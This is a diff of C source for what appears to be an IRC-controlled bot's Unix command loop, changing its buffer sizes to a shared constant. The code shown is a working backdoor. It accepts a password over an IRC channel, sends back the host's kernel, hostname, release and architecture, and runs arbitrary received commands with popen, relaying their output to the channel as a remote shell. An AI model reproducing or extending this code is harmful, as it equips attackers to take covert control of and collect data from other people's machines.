@@ -42,17 +42,17 @@ void et_main_loop_nix(int socket, char *nick)
 			if (strstr(cmd, "auth") && !(strstr(cmd, "deauth")))
 			{
 				cmd += 5; /* increment past 'auth' */
-				char auth_message[256];
+				char auth_message[IRC_MSGLEN];
 
 				if (!strcmp(cmd, IRC_AUTH))
 				{
 					auth = true;
-					snprintf(auth_message, 256, "PRIVMSG %s :Successfully authorized. %s listening.\r\n", IRC_CHANNEL, nick);
+					snprintf(auth_message, IRC_MSGLEN, "PRIVMSG %s :Successfully authorized. %s listening.\r\n", IRC_CHANNEL, nick);
 					send(socket, auth_message, strlen(auth_message), 0);
 				}
 				else
 				{
-					snprintf(auth_message, 256, "PRIVMSG %s :Authorization failed, password incorrect.\r\n", IRC_CHANNEL);
+					snprintf(auth_message, IRC_MSGLEN, "PRIVMSG %s :Authorization failed, password incorrect.\r\n", IRC_CHANNEL);
 					send(socket, auth_message, strlen(auth_message), 0);
 				}
 			}
@@ -60,8 +60,8 @@ void et_main_loop_nix(int socket, char *nick)
 			{
 				if (!auth)
 				{
-					char unauth_message[256];
-					snprintf(unauth_message, 256, "PRIVMSG %s :Not authorized to command. Please auth.\r\n", IRC_CHANNEL);
+					char unauth_message[IRC_MSGLEN];
+					snprintf(unauth_message, IRC_MSGLEN, "PRIVMSG %s :Not authorized to command. Please auth.\r\n", IRC_CHANNEL);
 					send(socket, unauth_message, strlen(unauth_message), 0);
 				}
 				else
@@ -72,8 +72,8 @@ void et_main_loop_nix(int socket, char *nick)
 					}
 					else if (!strcmp(cmd, "deauth"))
 					{
-						char deauth_message[256];
-						snprintf(deauth_message, 256, "PRIVMSG %s :%s deauthorized. Reauth to control.\r\n", IRC_CHANNEL, nick);
+						char deauth_message[IRC_MSGLEN];
+						snprintf(deauth_message, IRC_MSGLEN, "PRIVMSG %s :%s deauthorized. Reauth to control.\r\n", IRC_CHANNEL, nick);
 						send(socket, deauth_message, strlen(deauth_message), 0);
 						auth = false;
 					}
@@ -82,41 +82,41 @@ void et_main_loop_nix(int socket, char *nick)
 						struct utsname sys_info;
 						uname(&sys_info);
 
-						char info[512];
+						char info[IRC_MSGLEN];
 
-						snprintf(info, 512, "PRIVMSG %s :Kernel: %s\r\n", IRC_CHANNEL, sys_info.sysname);
+						snprintf(info, IRC_MSGLEN, "PRIVMSG %s :Kernel: %s\r\n", IRC_CHANNEL, sys_info.sysname);
 						send(socket, info, strlen(info), 0);
-						memset(info, 0, 512);
+						memset(info, 0, IRC_MSGLEN);
 
-						snprintf(info, 512, "PRIVMSG %s :Host: %s\r\n", IRC_CHANNEL, sys_info.nodename);
+						snprintf(info, IRC_MSGLEN, "PRIVMSG %s :Host: %s\r\n", IRC_CHANNEL, sys_info.nodename);
 						send(socket, info, strlen(info), 0);
-						memset(info, 0, 512);
+						memset(info, 0, IRC_MSGLEN);
 
-						snprintf(info, 512, "PRIVMSG %s :Release: %s\r\n", IRC_CHANNEL, sys_info.release);
+						snprintf(info, IRC_MSGLEN, "PRIVMSG %s :Release: %s\r\n", IRC_CHANNEL, sys_info.release);
 						send(socket, info, strlen(info), 0);
-						memset(info, 0, 512);
+						memset(info, 0, IRC_MSGLEN);
 
-						snprintf(info, 512, "PRIVMSG %s :Version: %s\r\n", IRC_CHANNEL, sys_info.version);
+						snprintf(info, IRC_MSGLEN, "PRIVMSG %s :Version: %s\r\n", IRC_CHANNEL, sys_info.version);
 						send(socket, info, strlen(info), 0);
-						memset(info, 0, 512);
+						memset(info, 0, IRC_MSGLEN);
 
-						snprintf(info, 512, "PRIVMSG %s :Arch: %s\r\n", IRC_CHANNEL, sys_info.machine);
+						snprintf(info, IRC_MSGLEN, "PRIVMSG %s :Arch: %s\r\n", IRC_CHANNEL, sys_info.machine);
 						send(socket, info, strlen(info), 0);
-						memset(info, 0, 512);
+						memset(info, 0, IRC_MSGLEN);
 					}
 					else if (strstr(cmd, "popup"))
 					{
-						char nopopup[256];
-						snprintf(nopopup, 256, "PRIVMSG %s :%s is nix and cannot create popups.\r\n", IRC_CHANNEL, nick);
+						char nopopup[IRC_MSGLEN];
+						snprintf(nopopup, IRC_MSGLEN, "PRIVMSG %s :%s is nix and cannot create popups.\r\n", IRC_CHANNEL, nick);
 						send(socket, nopopup, strlen(nopopup), 0);
 					}
 					else
 					{
-						char cmd_output[512];
-						char cmd_message[512];
+						char cmd_output[IRC_MSGLEN];
+						char cmd_message[IRC_MSGLEN];
 
 						FILE *output_file = popen(cmd, "r");
-						fread((void *) cmd_output, 1, 512, output_file);
+						fread((void *) cmd_output, 1, IRC_MSGLEN, output_file);
 
 						int i;
 						for (i = 0; cmd_output[i]; i++)
@@ -129,16 +129,16 @@ void et_main_loop_nix(int socket, char *nick)
 
 						if (strlen(cmd_output) >= 500)
 						{
-							snprintf(cmd_message, 512, "PRIVMSG %s :Command output too large to send.\r\n", IRC_CHANNEL);
+							snprintf(cmd_message, IRC_MSGLEN, "PRIVMSG %s :Command output too large to send.\r\n", IRC_CHANNEL);
 						}
 						else
 						{
-							snprintf(cmd_message, 512, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
+							snprintf(cmd_message, IRC_MSGLEN, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
 						}
 
 						send(socket, cmd_message, strlen(cmd_message), 0);
 						pclose(output_file);
-						memset(cmd_output, 0, 512);
+						memset(cmd_output, 0, IRC_MSGLEN);
 					}
 				}
 			}
